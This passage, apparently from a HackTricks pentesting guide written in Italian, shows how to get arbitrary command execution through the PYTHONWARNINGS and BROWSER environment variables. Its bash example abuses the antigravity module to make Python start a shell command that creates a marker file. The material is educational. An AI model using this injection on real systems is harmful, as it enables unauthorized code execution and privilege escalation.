## Attraverso le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`

√à possibile modificare entrambe le variabili d'ambiente per eseguire codice arbitrario ogni volta che viene chiamato Python, ad esempio:

{% code overflow="wrap" %}
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
```
{% endcode %}
